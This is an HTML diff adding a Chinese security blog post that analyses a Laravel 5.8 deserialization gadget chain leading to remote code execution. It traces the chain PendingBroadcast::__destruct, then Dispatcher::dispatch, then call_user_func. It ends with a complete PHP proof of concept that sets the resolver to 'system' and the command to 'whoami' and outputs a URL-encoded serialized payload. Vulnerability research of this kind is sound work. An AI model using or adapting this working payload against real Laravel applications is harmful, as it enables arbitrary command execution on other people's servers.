@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/atom-one-dark.css">
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>laravel 5.8 反序列化漏洞分析</h1>
+                    <h2 class="subheading">Include POP and EXP</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on July 10, 2021</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;前阵子分析过用laravel 6.20框架编写的lightcms v1.5.7中的漏洞，其中所用到的是5.8版本中的phar反序列化链子，
+                	借此来分析一下。</p>
+
+                <h2 class="section-heading">配置环境</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;使用composer下载laravel 5.8。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/install.jpg" alt="">
+                </a>
+                
+                <h2 class="section-heading">dispatch()方法rce漏洞</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;首先，注册一个get路由。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/pop-1.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;接着，写好路由中触发的控制器。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/pop-2.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;来到触发点PendingBroadcast类中的__destruct()方法。
+                	可以看到这里的$this->events跟$this->event可控。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/pop-3.jpg" alt="">
+                </a>
+                
+								<p>&nbsp;&nbsp;&nbsp;寻找一个有dispatch()方法的类，这里$this->events构造为Dispatcher类，跟随变量流向来到Dispatcher类中。
+									众所周知，这里的dispatch()方法是个好东西，里面调用了$this->dispatchToQueue()方法，可以用来调用任意类(虽然我没复现之前不知道)。</p>
+								<p>&nbsp;&nbsp;&nbsp;不过，要想调用$this->dispatchToQueue()方法还需要构造if中的两个条件为true。第一个条件$this->queueResolver直接赋值即可，
+									这里讲一下第二个条件$this->commandShouldBeQueued($command)。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/pop-4.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;来到$this->commandShouldBeQueued($command)方法中，可以看到$command是类名，这里要返回一个ShouldQueue接口类，全局find usage找一个ShouldQueue接口类就行。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/pop-5.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;接着，便进入if条件调用$this->dispatchToQueue($command)方法了。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/pop-6.jpg" alt="">
+                </a>
+                
+                <p>&nbsp;&nbsp;&nbsp;可以看到$this->queueResolver是call_user_func()函数中的第一个参数，$connection为第二个参数。
+                	$this->queueResolver是Dispatcher类中的成员变量，这里直接覆盖就可以了。
+                	而$connection是由$command->connection赋值过来的，$command又是由上面$this->ShouldBeQueued($command)方法返回的ShouldQueue接口类。
+                	只要给ShouldQueue接口类中的成员变量($this->connection)赋值即可。</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/2021-7-10/pop-7.jpg" alt="">
+                </a>
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                
+                <h2 class="section-heading">POC</h2>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="php"><span class="hljs-preprocessor">&lt;?php</span>
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>;
+
+    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span>\<span class="hljs-title">Dispatcher</span>;
+    
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PendingBroadcast</span>
+    </span>{
+    
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$events</span>;
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$event</span>;
+    
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">(<span class="hljs-variable">$obj_destruct</span>, <span class="hljs-variable">$obj_implements</span>)</span>
+        </span>{
+            <span class="hljs-variable">$this</span>-&gt;events = <span class="hljs-variable">$obj_destruct</span>;
+            <span class="hljs-variable">$this</span>-&gt;event = <span class="hljs-variable">$obj_implements</span>;
+        }
+    
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span>
+        </span>{
+            <span class="hljs-variable">$this</span>-&gt;events-&gt;dispatch(<span class="hljs-variable">$this</span>-&gt;event);
+        }
+    }
+
+    <span class="hljs-variable">$obj_destruct</span> = <span class="hljs-keyword">new</span> Dispatcher();
+    <span class="hljs-variable">$obj_implements</span> = <span class="hljs-keyword">new</span> BroadcastEvent(<span class="hljs-string">'17'</span>);
+    <span class="hljs-variable">$pwn</span> = <span class="hljs-keyword">new</span> PendingBroadcast(<span class="hljs-variable">$obj_destruct</span>, <span class="hljs-variable">$obj_implements</span>);
+    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$pwn</span>));
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Bus</span>;
+
+    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Contracts</span>\<span class="hljs-title">Queue</span>\<span class="hljs-title">Queue</span>;
+    <span class="hljs-keyword">use</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Contracts</span>\<span class="hljs-title">Queue</span>\<span class="hljs-title">ShouldQueue</span>;
+    
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Dispatcher</span>
+    </span>{
+        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$queueResolver</span> = <span class="hljs-string">'system'</span>;
+    
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatch</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
+        </span>{
+            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$this</span>-&gt;queueResolver &amp;&amp; <span class="hljs-variable">$this</span>-&gt;commandShouldBeQueued(<span class="hljs-variable">$command</span>)) {
+                <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;dispatchToQueue(<span class="hljs-variable">$command</span>);
+            }
+        }
+    
+        <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">commandShouldBeQueued</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
+        </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-variable">$command</span> <span class="hljs-keyword">instanceof</span> ShouldQueue;
+        }
+    
+        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dispatchToQueue</span><span class="hljs-params">(<span class="hljs-variable">$command</span>)</span>
+        </span>{
+            <span class="hljs-variable">$connection</span> = <span class="hljs-variable">$command</span>-&gt;connection ?? <span class="hljs-keyword">null</span>;
+    
+            <span class="hljs-variable">$queue</span> = call_user_func(<span class="hljs-variable">$this</span>-&gt;queueResolver, <span class="hljs-variable">$connection</span>);
+        }
+    }
+
+<span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>;
+
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BroadcastEvent</span>
+    </span>{
+        <span class="hljs-keyword">public</span> <span class="hljs-variable">$connection</span> = <span class="hljs-string">'whoami'</span>;
+    }</span></code></pre>
+                	
+                </div>
+
+
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2021</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+</body>
+
+</html>
